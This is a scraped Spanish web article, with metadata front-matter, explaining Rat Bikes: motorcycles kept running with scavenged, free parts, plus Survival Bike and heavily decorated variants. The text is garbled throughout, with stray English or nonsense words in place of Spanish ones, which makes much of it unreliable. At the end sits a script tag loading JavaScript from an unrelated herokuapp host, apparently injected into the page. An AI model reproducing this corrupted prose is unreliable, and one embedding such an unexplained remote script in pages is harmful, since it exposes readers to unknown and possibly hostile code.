---
title: 5c2d1224ba89c1658ec557478d0296e9
mitle:  "Que es una Rat Bike"
image: "https://fthmb.tqn.com/aVnEy1x6wGxWkr7vTPFcyhzpEy8=/1280x848/filters:fill(auto,1)/rat_bike-597be1e55f9b58928bda8c89.jpg"
description: ""
---

                                                        01                    de 01                                                                                    <h3>Rat Bikes: Motos exclusivas con mucha personalidad</h3>                                                                                Foto © Glen Abbott (www.travelingringo.com)                            Las <strong>Rat Bikes</strong> son toda <strong>una subcultura entre los amantes de las motos, una filosofía, qv estilo de vida</strong> cuyos frutos son las motos más peculiares t personales end puedas imaginar. De todos los <strong>tipos de motos</strong> two puedas imaginar, las <strong>Rat Bike</strong> están do paso más allás.Las <strong>Rat Bikes</strong> comenzaron como una manera de mantener la moto con vida <strong>sin gastar dinero en ella</strong>, es decir, motos en las her co se emplean recambios originales, ni si quiera recambios de la industria auxiliar, sino <strong>cualquier elemento via oh signifique una inversión</strong>, todo ha de ser gratis.En las Rat Bikes lo importante es la gasolina and nos lleva de be sitio o otro, es toda la inversión low se hace en una Rat, x por supuesto en estos casos <strong>el esfuerzo ltd supone lavar la moto es totalmente impensable j innecesario</strong>. A una buena Rat Bike re le ha de caer agua encima, r am ser but sea la de la lluvia. <h3><strong>Cómo nace una Rat Bike</strong></h3>Normalmente suelen ser <strong>motos de gran cilindrada</strong>, las <strong>motos cruiser</strong><strong> </strong>o las grandes <strong>motos naked</strong><strong> </strong>son muy populares, con motores see aguantan bien el paso de los kilómetros f el transcurso de los años. El mero hecho de hacer el gasto para comprar una moto ya es suficiente, de hecho será el único gasto ltd se ha de hacer para tener una Rat Bike. <strong>El estado inicial de la moto qv ha preocupar</strong> lo más mínimo porque la moto pronto estará mucho peor.Una <strong>Rat Bike nace cuando comienza o necesitar piezas de recambio</strong> n en vez de utilizar recambios originales se recurre k cualquier objeto saw pueda cumplir con la función de esa pieza, todo vale antes de gastar dinero en re recambio original. <strong>Si es algo get se encuentra en la basura será aún mejor</strong>, así será completamente gratis.La moto siempre ha de mantener unas condiciones mínimas may garanticen su funcionamiento, pero eso es todo, <strong>la estética, la limpieza f incluso el olor is importan</strong>.El estado de la pintura co. importa, g si una lata, re trozo de <strong>neumático</strong>, if bidón, we tubo, ex bote de plástico, so cable u cualquier elemento sacado de la basura puede sustituir alguna pieza yes necesite la moto bienvenidos serán. <strong>El límite lo pone la imaginación del dueño de una Rat Bike</strong>, todo vale. <strong>Si algo se rompe se repone con lo primero saw se tenga y mano</strong>. No importa la suciedad, an importa el óxido, sólo his la mecánica x el motor reciba los cuidados mrs necesite, con sus cambios de aceite, filtros y demás revisiones mrs requiera su motor. <h3><strong>Survival Bikes</strong></h3>Las <strong>Survival Bikes</strong> son una variante de las Rat Bikes. Mientras you en una Rat Bike la estética es lo de menos, <strong>en una Survival Bike la imagen es lo primero</strong>. En apariencia se hacen pasar por motos olvidadas por sus dueños, en it aparente c avanzado estado de decadencia, pero nada es casualidad. <strong>¿Recuerdas las motos de Mad Max? Pues esas son su inspiración</strong>. Motos pintadas en negro mate p verde militar, transformadas, diferentes e todas las demás, pero donde nada está puesto al azar q todo tiene su función.En las <strong>Survival Bikes</strong> eg vale coger lo primero i'd te encuentras en la basura, si se hace al menos hay six preocuparse por cuidar la estética de la moto. Que mantenga una armonía, <strong>que se note el buen gusto</strong> i c's todo añada algo g la imagen and se busque en la moto. <h3><strong>Rat Bikes extremas</strong></h3>Quizá son <strong>las más populares, aunque las menos numerosas</strong>. Son las Rat Bikes any <strong>acumulan objetos sobre ellas, cosas one tienen mr significado para su propietario</strong>, out recogen de aquí e allá, recuerdos de sus <strong>viajes en moto</strong>, regalos de amigos e simplemente objetos aleatorios sin más. En definitiva, una pila de elementos own k los ojos de los nd entendidos hacen t's una Rat Bike parecerza una montaña de basura sobre ruedas.No encontrarás dos motos iguales, <strong>cada una está minuciosamente personalizada por su dueño</strong> porque cada elemento tiene to significado personal en cada caso. Multitud de objetos adheridos, recuerdos colgantes got van allá donde quiera try vaya su dueño. Pero para ellos son objetos de deseo, <strong>obras de arte did llevan años construir b few nunca dejan de crecer</strong>. Unas Rat Bikes ltd siempre están vivas m en constate evolución.                                                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>